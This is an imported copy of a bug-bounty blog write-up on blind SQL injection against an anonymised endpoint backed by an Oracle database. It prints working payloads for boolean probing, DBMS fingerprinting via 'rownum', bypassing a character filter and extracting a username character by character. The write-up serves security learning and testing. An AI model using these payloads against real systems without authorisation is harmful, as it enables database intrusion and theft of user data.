---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-04-16_tricky-oracle-sql-injection-situation.md
original_filename: 2020-04-16_tricky-oracle-sql-injection-situation.md
title: Tricky Oracle SQL Injection Situation
category: documents
detected_topics:
- sqli
- command-injection
- api-security
- supply-chain
tags:
- imported
- documents
- sqli
- command-injection
- api-security
- supply-chain
language: en
raw_sha256: a8ad94458cfdb448a7d655c1ae8041bd9c36997bc2e13b47d21c7e25f7f1621d
text_sha256: 2074c83b5fe5d7db9192394f4d5d778be1b31ae681d083729f810b3c69dabd72
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Tricky Oracle SQL Injection Situation

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-04-16_tricky-oracle-sql-injection-situation.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `a8ad94458cfdb448a7d655c1ae8041bd9c36997bc2e13b47d21c7e25f7f1621d`
- Text SHA256: `2074c83b5fe5d7db9192394f4d5d778be1b31ae681d083729f810b3c69dabd72`


## Content

---
title: "Tricky Oracle SQL Injection Situation"
page_title: "Tricky Oracle SQL Injection Situation ~ Random stuff by yappare"
url: "https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html"
final_url: "https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html"
authors: ["yappare (@yappare)"]
bugs: ["SQL injection"]
publication_date: "2020-04-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4652
---

##  [Tricky Oracle SQL Injection Situation](https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html)

on [April 16, 2020](https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html "permanent link") in [BugBounty](https://blog.yappare.com/search/label/BugBounty), [Security](https://blog.yappare.com/search/label/Security), [SQLi](https://blog.yappare.com/search/label/SQLi), [Tricks](https://blog.yappare.com/search/label/Tricks) [ No comments ](https://www.blogger.com/comment/fullpage/post/4407724975340972338/2693906985708632141) [ ![](//img2.blogblog.com/img/icon18_edit_allbkg.gif) ](https://www.blogger.com/post-edit.g?blogID=4407724975340972338&postID=2693906985708632141&from=pencil "Edit Post")

Recently I learnt few new stuff when solving SQL Injection found during pentest and also bugbounty. One of the new technique that seems new to me is the one that I learnt from my master, pokleyzz. This injection was found in a recent bugbounty program and the actual path/parameter were replaced.  
  
The injection was found on the "idNumber" parameter of the following endpoint  

> /foo/?theName=YAP&idNumber=248001[here]

Common payloads were performed on this target and initially, I found the following payloads were working to identify **TRUE** /**FALSE** condition  
  

> /foo/?theName=YAP&idNumber=248001'+AND+'1'='1 **TRUE**  
>  /foo/?theName=YAP&idNumber=248001'+AND+'2'='1 **FALSE**

  
and also able to use pipe operator too  
  

> /foo/?theName=YAP&idNumber=248'||'001 **TRUE**  
>  /foo/?theName=YAP&idNumber=24'||'8'||'001 **TRUE**  
>  /foo/?theName=YAP&idNumber=24'||'X'||'001 **FALSE**

  
With these conditions, I was able to narrow down the database used by this application to **Oracle** , **PosgreSQL** , **IBM DB2** or **Informix**.  
  
At first, I thought this can be done using the same technique that I know:  
  
See : <https://blog.yappare.com/2012/04/advance-oracle-blind-sql-injection.html>  
  
However, the **CASE()** was not working. After few attempts, I stopped to figure out on using **CASE()**. Next, this technique was tried:  
  
See: <https://blog.yappare.com/2017/03/blind-sql-injection-in-erim-not-sure.html>  
  
No joy. Dead end. After almost two days of trying, I give up doing it myself and ask helps from few friends.  
No luck. I tried my last option, pokleyzz. In just less than an hour, he showed me the technique that can be used.  
  

> /foo/?theName=YAP&idNumber=248'||<bruteforce any known SQL functions here>||'001

  
As a result, I found "**rownum** " was accepted and this indicates the DBMS is **Oracle**. To reconfirm, the following was queried:  
  

> /foo/?theName=YAP&idNumber=24800'||rownum||'

  
The above payload result in the website displayed list of "**theName** " product that starts with "**idNumber** " 24800  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4vsPOvfxB3Aqj5P3d66VuTcY3im0FK7HvLQz-fSXlqxbx040idsMjfc7KEgrEmu1h-xGESl9f_xtsT583jsO1l0zZAOVRU0Zq2u_a270lDlLWdjG-gyqYmb82XYQuXbL8VnIAhT-B0Ng/s320/Screenshot+at+2020-04-17+04-45-50.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4vsPOvfxB3Aqj5P3d66VuTcY3im0FK7HvLQz-fSXlqxbx040idsMjfc7KEgrEmu1h-xGESl9f_xtsT583jsO1l0zZAOVRU0Zq2u_a270lDlLWdjG-gyqYmb82XYQuXbL8VnIAhT-B0Ng/s1600/Screenshot+at+2020-04-17+04-45-50.png)

Interesting! Now how we can at least extract data from this injection? Another blocker was identified. It seems the application filtered/replaced the following characters

> _ ( ) + . whitespaces

While I found this seems another dead end, pokleyzz showed another brilliant way to extract the data using the following payload:  
  

> /foo/?theName=YAP&idNumber=248'||<bruteforce all column_name here>||'001 - _We found few column names which one of it was "username"_

Then final step was:  
  

> /foo/?theName=YAP&idNumber=248001'and''||username||''like'<bruteforce-character>%

I ran the Intruder on the above attacking point and voila, got the username 😼  
  
As always, pokleyzz is the best master I have. 💻  
  
Bye.  
  

Share: [__](https://www.facebook.com/share.php?v=4&src=bm&u=https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html&t=Tricky Oracle SQL Injection Situation "Share this on Facebook")[__](https://twitter.com/home?status=Tricky Oracle SQL Injection Situation -- https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html "Tweet This!")[__](https://plus.google.com/share?url=https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html "Share this on Google+")[__](https://pinterest.com/pin/create/button/?source_url=&media=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4vsPOvfxB3Aqj5P3d66VuTcY3im0FK7HvLQz-fSXlqxbx040idsMjfc7KEgrEmu1h-xGESl9f_xtsT583jsO1l0zZAOVRU0Zq2u_a270lDlLWdjG-gyqYmb82XYQuXbL8VnIAhT-B0Ng/s320/Screenshot+at+2020-04-17+04-45-50.png&description=Tricky Oracle SQL Injection Situation "Share on Pinterest")[__](https://www.linkedin.com/shareArticle?mini=true&title=Tricky Oracle SQL Injection Situation&url=https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html "Share this on Linkedin")

[Email This](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=2693906985708632141&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=2693906985708632141&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=2693906985708632141&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=2693906985708632141&target=facebook "Share to Facebook")
